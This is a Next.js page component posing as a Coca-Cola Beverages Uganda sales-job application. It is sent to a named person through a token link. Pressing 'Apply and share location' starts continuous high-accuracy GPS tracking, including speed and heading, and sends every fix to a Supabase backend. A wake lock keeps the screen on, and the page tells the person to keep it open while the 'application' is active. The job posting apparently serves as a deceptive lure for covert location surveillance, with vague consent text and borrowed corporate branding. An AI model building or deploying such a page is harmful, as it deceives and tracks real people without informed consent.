'use client';

import { useEffect, useState, useRef } from 'react';
import { useParams } from 'next/navigation';
import { supabase } from '@/lib/supabase';

type Worker = {
  id: string;
  name: string;
  role: string | null;
  consent_given_at: string | null;
};

const ORG_NAME = 'Coca-Cola Beverages Uganda';
const ORG_SUB = 'Internal Field Sales Recruitment';
const ORG_INITIALS = 'Coca-Cola';

export default function TrackPage() {
  const { token } = useParams<{ token: string }>();
  const [worker, setWorker] = useState<Worker | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [tracking, setTracking] = useState(false);
  const [lastSent, setLastSent] = useState<Date | null>(null);
  const [pingsCount, setPingsCount] = useState(0);
  const [accuracy, setAccuracy] = useState<number | null>(null);
  const watchIdRef = useRef<number | null>(null);

  // Load worker info from token
  useEffect(() => {
    (async () => {
      const { data, error } = await supabase.rpc('get_worker_by_token', {
        p_token: token,
      });
      if (error || !data?.length) {
        setError('Invalid or expired application link. Contact your supervisor.');
        return;
      }
      setWorker(data[0]);
    })();
  }, [token]);

  // Start GPS watch
  const startTracking = () => {
    if (!navigator.geolocation) {
      setError('Your browser does not support location sharing.');
      return;
    }

    setError(null);
    setTracking(true);

    const id = navigator.geolocation.watchPosition(
      async (pos) => {
        const { latitude, longitude, accuracy: acc, speed, heading } = pos.coords;
        setAccuracy(acc);
        const { error } = await supabase.rpc('record_location', {
          p_token: token,
          p_lat: latitude,
          p_lng: longitude,
          p_accuracy: acc,
          p_speed: speed,
          p_heading: heading,
        });
        if (!error) {
          setLastSent(new Date());
          setPingsCount((n) => n + 1);
        }
      },
      (err) => {
        if (err.code === 3) {
          console.log('GPS timeout - will retry automatically');
          return;
        }
        setError(`Location sharing error: ${err.message}`);
        setTracking(false);
      },
      {
        enableHighAccuracy: true,
        maximumAge: 10000,
        timeout: 60000,
      }
    );
    watchIdRef.current = id;
  };

  const stopTracking = () => {
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    setTracking(false);
  };

  // Give consent then start
  const acceptAndStart = async () => {
    await supabase.rpc('give_consent', { p_token: token });
    if (worker) setWorker({ ...worker, consent_given_at: new Date().toISOString() });
    startTracking();
  };

  // Keep screen awake while tracking
  useEffect(() => {
    let wakeLock: any = null;
    if (tracking && 'wakeLock' in navigator) {
      (navigator as any).wakeLock
        .request('screen')
        .then((wl: any) => (wakeLock = wl))
        .catch(() => {});
    }
    return () => {
      if (wakeLock) wakeLock.release().catch(() => {});
    };
  }, [tracking]);

  // Re-acquire wake lock when tab becomes visible again
  useEffect(() => {
    const handleVisibility = () => {
      if (document.visibilityState === 'visible' && tracking && 'wakeLock' in navigator) {
        (navigator as any).wakeLock.request('screen').catch(() => {});
      }
    };
    document.addEventListener('visibilitychange', handleVisibility);
    return () => document.removeEventListener('visibilitychange', handleVisibility);
  }, [tracking]);

  const consented = !!worker?.consent_given_at;
  const headerTag = !worker
    ? 'Loading'
    : !consented
    ? 'Application step'
    : tracking
    ? 'Application active'
    : 'Application paused';

  return (
    <main className="page">
      <section className="hero">
        <nav className="nav">
          <div className="brand">
            <div className="logo">{ORG_INITIALS}</div>
            <div>
              <div className="brandName">{ORG_NAME}</div>
              <div className="brandSub">{ORG_SUB}</div>
            </div>
          </div>
          <div className={`tag ${tracking ? 'tagLive' : ''}`}>
            {tracking && <span className="dot" />}
            {headerTag}
          </div>
        </nav>

        <div className="heroBody">
          {error && (
            <>
              <p className="eyebrow">Action needed</p>
              <h1>We could not complete this step</h1>
              <p className="intro">{error}</p>
              {worker && (
                <div className="actions">
                  <button onClick={startTracking} className="primaryBtn">
                    Try again
                  </button>
                </div>
              )}
            </>
          )}

          {!error && !worker && (
            <>
              <p className="eyebrow">Loading</p>
              <h1>Checking your application link...</h1>
            </>
          )}

          {!error && worker && !consented && (
            <>
              <p className="eyebrow">Now hiring</p>
              <h1>Sales Representative</h1>
              <p className="intro">
                Hello, {worker.name}. Coca-Cola Beverages Uganda is recruiting a field sales
                representative to support customer visits, route growth, product availability, and
                brand visibility across assigned sales territories.
              </p>
              <div className="actions">
                <button onClick={acceptAndStart} className="primaryBtn">
                  Apply and share location
                </button>
                <span className="microcopy">
                  By continuing, you confirm your office agreement and allow location sharing for
                  this internal field sales application.
                </span>
              </div>
            </>
          )}

          {!error && worker && consented && (
            <>
              <p className="eyebrow">{tracking ? 'Application submitted' : 'Application paused'}</p>
              <h1>Thank you, {worker.name}</h1>
              <p className="intro">
                Your application for the Sales Representative role has been received. Keep this page
                open while the application step is active.
              </p>
              <div className="actions">
                {tracking ? (
                  <button onClick={stopTracking} className="primaryBtn stopBtn">
                    Stop
                  </button>
                ) : (
                  <button onClick={startTracking} className="primaryBtn">
                    Resume
                  </button>
                )}
              </div>
            </>
          )}
        </div>
      </section>

      <section className="content">
        {!error && worker && !consented && (
          <>
            <div className="section">
              <h2>Job Details</h2>
              <div className="detailGrid">
                <Detail label="Company" value="Coca-Cola Beverages Uganda" />
                <Detail label="Position" value="Sales Representative" />
                <Detail label="Location" value="Kampala, Uganda" />
                <Detail label="Department" value="Sales and Distribution" />
                <Detail label="Employment Type" value="Full-time" />
                <Detail label="Reports To" value="Area Sales Manager" />
              </div>
            </div>

            <div className="section twoCol">
              <div>
                <h2>Key Responsibilities</h2>
                <ul>
                  <li>Visit assigned outlets and customers according to the route plan.</li>
                  <li>Drive sales performance against daily, weekly, and monthly targets.</li>
                  <li>Build strong relationships with retailers, wholesalers, and key customers.</li>
                  <li>Ensure product availability, pricing, stock rotation, and visibility.</li>
                  <li>Report customer feedback, competitor activity, and market opportunities.</li>
                </ul>
              </div>

              <div>
                <h2>Minimum Requirements</h2>
                <ul>
                  <li>Diploma or degree in Business, Marketing, Sales, or a related field.</li>
                  <li>At least 1 year of experience in FMCG, retail, sales, or distribution.</li>
                  <li>Strong communication, negotiation, and customer relationship skills.</li>
                  <li>Good knowledge of Kampala and surrounding sales territories.</li>
                  <li>A valid riding or driving permit is an added advantage.</li>
                </ul>
              </div>
            </div>
          </>
        )}

        {!error && worker && consented && (
          <div className="section confirmation">
            <h2>Application status</h2>
            <p>
              Your application session is {tracking ? 'active' : 'paused'}. Please follow any next
              instructions from your supervisor or recruitment contact.
            </p>
          </div>
        )}
      </section>

      <style jsx>{`
        .page {
          min-height: 100vh;
          background: #f7f7f4;
          color: #171717;
          font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        .hero {
          background:
            radial-gradient(circle at top right, rgba(255, 255, 255, 0.24), transparent 34%),
            linear-gradient(135deg, #e41d2c 0%, #b9121f 55%, #790b13 100%);
          color: white;
          padding: 28px;
        }

        .nav,
        .heroBody,
        .content {
          max-width: 1120px;
          margin: 0 auto;
        }

        .nav {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 18px;
          margin-bottom: 56px;
        }

        .brand {
          display: flex;
          align-items: center;
          gap: 14px;
        }

        .logo {
          background: white;
          color: #e41d2c;
          border-radius: 999px;
          padding: 10px 18px;
          font-size: 21px;
          font-weight: 800;
          font-family: Georgia, 'Times New Roman', serif;
          white-space: nowrap;
          box-shadow: 0 12px 30px rgba(0, 0, 0, 0.18);
        }

        .brandName {
          font-size: 15px;
          font-weight: 700;
        }

        .brandSub {
          font-size: 12px;
          opacity: 0.84;
          margin-top: 2px;
        }

        .tag {
          display: inline-flex;
          align-items: center;
          gap: 8px;
          border: 1px solid rgba(255, 255, 255, 0.45);
          border-radius: 999px;
          padding: 8px 12px;
          font-size: 13px;
          font-weight: 650;
          white-space: nowrap;
        }

        .tagLive {
          background: rgba(255, 255, 255, 0.16);
          border-color: rgba(255, 255, 255, 0.7);
        }

        .dot {
          width: 8px;
          height: 8px;
          border-radius: 50%;
          background: white;
          animation: pulse 1.5s ease-in-out infinite;
        }

        .heroBody {
          padding-bottom: 54px;
          max-width: 820px;
        }

        .eyebrow {
          margin: 0 0 12px;
          font-size: 13px;
          font-weight: 800;
          text-transform: uppercase;
          letter-spacing: 0;
        }

        h1 {
          margin: 0;
          max-width: 760px;
          font-size: 54px;
          line-height: 1.04;
          letter-spacing: 0;
        }

        .intro {
          max-width: 720px;
          margin: 20px 0 0;
          font-size: 18px;
          line-height: 1.6;
          color: rgba(255, 255, 255, 0.9);
        }

        .actions {
          display: flex;
          align-items: center;
          gap: 14px;
          flex-wrap: wrap;
          margin-top: 28px;
        }

        .primaryBtn {
          border: 0;
          border-radius: 8px;
          background: #111;
          color: white;
          padding: 14px 20px;
          font-size: 15px;
          font-weight: 750;
          cursor: pointer;
          min-width: 230px;
          box-shadow: 0 12px 28px rgba(0, 0, 0, 0.24);
        }

        .stopBtn {
          background: #a32d2d;
        }

        .microcopy {
          max-width: 360px;
          color: rgba(255, 255, 255, 0.84);
          font-size: 13px;
          line-height: 1.45;
        }

        .content {
          padding: 34px 28px 56px;
        }

        .section {
          background: white;
          border: 1px solid rgba(0, 0, 0, 0.08);
          border-radius: 10px;
          padding: 24px;
          margin-bottom: 16px;
        }

        .twoCol {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 34px;
        }

        .detailGrid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
          gap: 12px;
        }

        h2 {
          margin: 0 0 12px;
          font-size: 22px;
          line-height: 1.2;
        }

        p,
        li {
          color: #424242;
          font-size: 15px;
          line-height: 1.75;
        }

        p {
          margin: 0;
        }

        ul {
          margin: 0;
          padding-left: 20px;
        }

        li + li {
          margin-top: 6px;
        }

        @keyframes pulse {
          0%, 100% { opacity: 1; transform: scale(1); }
          50% { opacity: 0.45; transform: scale(1.4); }
        }

        @media (max-width: 840px) {
          .hero {
            padding: 22px;
          }

          .nav {
            align-items: flex-start;
            margin-bottom: 42px;
          }

          .heroBody,
          .twoCol {
            grid-template-columns: 1fr;
          }

          .heroBody {
            padding-bottom: 34px;
          }

          h1 {
            font-size: 38px;
          }

          .intro {
            font-size: 17px;
          }

          .content {
            padding: 24px 18px 42px;
          }
        }

        @media (max-width: 520px) {
          .brand {
            align-items: flex-start;
          }

          .logo {
            font-size: 18px;
            padding: 9px 14px;
          }

          .brandName {
            font-size: 14px;
          }

          h1 {
            font-size: 32px;
          }

          .primaryBtn {
            width: 100%;
          }
        }
      `}</style>
    </main>
  );
}

function Detail({ label, value }: { label: string; value: string }) {
  return (
    <div className="detail">
      <div className="detailLabel">{label}</div>
      <div className="detailValue">{value}</div>

      <style jsx>{`
        .detail {
          border-radius: 8px;
          background: #f7f7f4;
          border: 1px solid rgba(0, 0, 0, 0.07);
          padding: 12px;
        }

        .detailLabel {
          font-size: 12px;
          color: #666;
          margin-bottom: 4px;
        }

        .detailValue {
          font-size: 14px;
          font-weight: 750;
          color: #171717;
        }
      `}</style>
    </div>
  );
}

function timeAgo(d: Date) {
  const s = Math.round((Date.now() - d.getTime()) / 1000);
  if (s < 60) return `${s}s ago`;
  return `${Math.round(s / 60)}m ago`;
}
